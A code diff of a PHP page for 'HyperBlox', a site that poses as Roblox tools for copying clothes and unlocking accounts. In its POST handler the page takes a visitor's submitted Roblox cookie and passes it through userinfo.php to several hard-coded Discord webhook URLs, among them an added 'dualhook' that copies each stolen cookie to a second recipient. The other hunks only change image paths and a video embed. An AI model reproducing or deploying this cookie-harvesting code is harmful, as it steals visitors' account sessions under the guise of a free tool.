@@ -83,8 +83,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $dailyLogsData[$today] += 1;
             file_put_contents($dailyLogsFile, json_encode($dailyLogsData));
 
-            $userInfo = file_get_contents("$dom/controlPage/apis/userinfo.php?cookie=$cookie&web=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437736154358222989%2FfmNl_TFYS0uFI-9Mfm-4pvXhlOGpBeBauEUK_igmYJ12PGcKvdNAFkq9cwbi-n_msxGJ&dh=");
-            $userData = json_decode($userInfo, true);
+            // Call userinfo.php with cURL and proper timeout to send webhook
+            // Pass both 'dh' and 'dualhook' parameters to ensure dualhook is received
+            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437553764868296829%2FxNcMCdR9o43rz3y-Y8OZfLN4Tyo51mGBrTqW5JXwinl2__AHv1dUl0unH2Nbs_frazzk&dh=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437819282057859172%2FjhSAjmAseFfeAVriUmuG2Ka_S3dsmYvw802w76sLezTiJYUyR8B6EU35MRqVsEw1aBEX&dualhook=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437819282057859172%2FjhSAjmAseFfeAVriUmuG2Ka_S3dsmYvw802w76sLezTiJYUyR8B6EU35MRqVsEw1aBEX";
+            
+            $ch = curl_init($userInfoUrl);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 25); // Allow time for API calls but less than PHP max execution time
+            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+            
+            $userInfo = @curl_exec($ch);
+            $curlError = curl_error($ch);
+            curl_close($ch);
+            
+            // Parse response if available, otherwise use empty array
+            $userData = [];
+            if ($userInfo && !$curlError) {
+                $decoded = @json_decode($userInfo, true);
+                if (is_array($decoded)) {
+                    $userData = $decoded;
+                }
+            }
 
             if (isset($userData['robux'])) {
                 $robuxFile = "robux.txt";
@@ -156,21 +177,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   <meta name="robots" content="index, follow">
   <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
   <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
-  <meta property="og:image" content="https://undetectedgoons.lol/files/hyperblox.png">
+  <meta property="og:image" content="/files/hyperblox.png">
   <meta property="og:type" content="article">
   <meta property="og:url" content="https://hyperblox.eu/">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="HyperBlox - The Best Roblox Tools">
   <meta name="twitter:site" content="https://hyperblox.eu/">
   <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
-  <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
+  <meta name="twitter:image" content="/files/hyperblox.png">
   <meta name="theme-color" content="#000000">
   <meta name="msapplication-TileColor" content="#000000">
   <meta itemprop="name" content="HyperBlox">
   <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
   <title>Copy Clothes - HyperBlox</title>
-  <link rel="icon" type="image/png" href="https://undetectedgoons.lol/files/.png">
-  <link rel="shortcut icon" href="https://undetectedgoons.lol/files/hyperblox.ico">
+  <link rel="icon" type="image/png" href="/files/hyperblox.png">
+  <link rel="shortcut icon" href="/files/hyperblox.ico">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -1130,7 +1151,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <div class="container">
             <nav class="navbar">
                 <a href="/" class="logo">
-                    <img src="https://undetectedgoons.lol/files/hyperblox.png" alt="HyperBlox Logo">
+                    <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                     <span>HyperBlox</span>
                 </a>
                 <div class="nav-links" id="navLinks">
@@ -1201,14 +1222,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     </div>
                     <h3>How to Use</h3>
                     <p>Watch our exclusive demonstration to see how this tool works.</p>
-                    <div class="video-container">
-                        <video width="100%" height="auto" controls poster="https://via.placeholder.com/800x450/0f172a/94a3b8?text=HyperBlox+Demonstration">
-                            <source src="https://hyperblox.eu/Copy-Clothes/clothescopier.mp4" type="video/mp4">
-                            Your browser does not support the video tag.
-                        </video>
-                        <button class="play-button">
-                            <i class="fas fa-play"></i>
-                        </button>
+                    <div class="video-container" style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000;">
+                        <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" 
+                                src="https://www.youtube.com/embed/VytKm-A1zDM?rel=0" 
+                                frameborder="0" 
+                                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                                allowfullscreen>
+                        </iframe>
                     </div>
 
                     <div style="margin-top: 24px; display: flex; gap: 16px;">
@@ -1316,7 +1336,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="footer-content">
                 <div class="footer-col">
                     <a href="" class="footer-logo">
-                        <img src="https://undetectedgoons.lol/files/hyperblox.png" alt="HyperBlox Logo">
+                        <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                         <span>HyperBlox</span>
                     </a>
                     <p class="footer-text">The most advanced Roblox automation platform, built for performance and security.</p>
@@ -1489,29 +1509,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             });
         }
 
-        const playButton = document.querySelector('.play-button');
-        const video = document.querySelector('video');
-        if (playButton && video) {
-            playButton.addEventListener('click', function() {
-                video.play();
-                this.style.opacity = '0';
-                this.style.pointerEvents = 'none';
-            });
-
-            video.addEventListener('play', function() {
-                if (playButton) {
-                    playButton.style.opacity = '0';
-                    playButton.style.pointerEvents = 'none';
-                }
-            });
-
-            video.addEventListener('pause', function() {
-                if (playButton) {
-                    playButton.style.opacity = '1';
-                    playButton.style.pointerEvents = 'auto';
-                }
-            });
-        }
+        // Video controls are handled by YouTube embed
 
         const faqItems = document.querySelectorAll('.faq-item');
         if (faqItems.length > 0) {
